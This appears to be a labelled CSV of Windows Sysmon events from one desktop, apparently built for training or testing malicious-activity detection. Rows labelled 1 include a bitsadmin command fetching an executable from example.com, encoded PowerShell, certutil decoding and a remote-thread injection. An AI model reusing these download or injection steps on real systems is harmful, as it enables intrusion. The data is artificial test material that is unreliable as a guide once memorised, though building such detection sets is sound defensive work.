Message,label
File created: RuleName: - UtcTime: 2025-11-27 18:03:04.944 ProcessGuid: {3a35410f-9254-6928-1210-000000000b00} ProcessId: 1720 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_ikzxnoa5.0mq.ps1 CreationUtcTime: 2025-11-27 18:03:04.944 User: DESKTOP-EJG8QJC\Emil Jinu,1
Network connection detected: RuleName: Usermode UtcTime: 2025-11-27 15:33:24.105 ProcessGuid: {3a35410f-6f23-6928-fc03-000000000b00} ProcessId: 12668 Image: C:\Users\Emil Jinu\AppData\Local\Programs\Microsoft VS Code\Code.exe User: DESKTOP-EJG8QJC\Emil Jinu Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 10.0.2.15 SourceHostname: DESKTOP-EJG8QJC SourcePort: 53254 SourcePortName: - DestinationIsIpv6: false DestinationIp: 13.69.116.104 DestinationHostname: - DestinationPort: 443 DestinationPortName: https,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:05:47.176 ProcessGuid: {3a35410f-92fb-6928-2614-000000000b00} ProcessId: 18076 Image: C:\Windows\System32\SecurityHealthHost.exe FileVersion: 4.18.1907.16384 (WinBuild.160101.0800) Description: Windows Security Health Host Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: SecurityHealthHost.exe CommandLine: C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=BC84EF67269A2AEF02EBA5AA8FB69BEC,SHA256=08C05285CE0BA345A39C08D70D6686706CDCB847A220A1CA34F5BFECC8CD8857,IMPHASH=4E28FDA241BEFA94F219E0683850258F ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00} ParentProcessId: 848 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p ParentUser: NT AUTHORITY\SYSTEM",1
Dns query: RuleName: - UtcTime: 2025-11-27 15:40:14.200 ProcessGuid: {3a35410f-700f-6928-4404-000000000b00} ProcessId: 13688 QueryName: wpad QueryStatus: 123 QueryResults: - Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:02:11.476 ProcessGuid: {3a35410f-9223-6928-510f-000000000b00} ProcessId: 14064 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUAMQA1ADMAJwA= CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:29.297 ProcessGuid: {3a35410f-8ab4-6928-7107-000000000b00} ProcessId: 12724 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{82CA8DE3-01AD-4CEA-9D75-BE4C51810A9E}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:04:52.127 ProcessGuid: {3a35410f-92c4-6928-e612-000000000b00} ProcessId: 13392 Image: C:\Windows\System32\bitsadmin.exe FileVersion: 7.8.19041.1 (WinBuild.160101.0800) Description: BITS administration utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: bitsadmin.exe CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job26 http://example.com/file.exe C:\Temp\file26.exe CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
CreateRemoteThread detected: RuleName: - UtcTime: 2025-11-27 18:03:55.849 SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} SourceProcessId: 4396 SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetProcessGuid: {3a35410f-928b-6928-5e11-000000000b00} TargetProcessId: 13172 TargetImage: <unknown process> NewThreadId: 3712 StartAddress: 0x00007FF6970C30D0 StartModule: - StartFunction: - SourceUser: DESKTOP-EJG8QJC\Emil Jinu TargetUser: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 15:49:23.357 ProcessGuid: {3a35410f-7303-6928-ba04-000000000b00} ProcessId: 6944 Image: C:\Windows\System32\backgroundTaskHost.exe FileVersion: 10.0.19041.3636 (WinBuild.160101.0800) Description: Background Task Host Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: backgroundTaskHost.exe CommandLine: ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca CurrentDirectory: C:\Program Files\WindowsApps\Microsoft.YourPhone_1.25072.79.0_x64__8wekyb3d8bbwe\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=D4F3D9A5EC7B4EE9E7C9694E7C72DD45,SHA256=7077CBF56490C86FC74C0CC6C0379AB679F06A066E71906AD23458F664836449,IMPHASH=D2ACF1CBC4A6DB14A34C687B9362D66B ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00} ParentProcessId: 848 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p ParentUser: NT AUTHORITY\SYSTEM",0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:38:07.257 ProcessGuid: {3a35410f-8c7f-6928-d907-000000000b00} ProcessId: 11340 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -decode C:\Windows\win.ini C:\Temp\decoded_fake.txt CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-8909-6928-0207-000000000b00} ParentProcessId: 14160 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
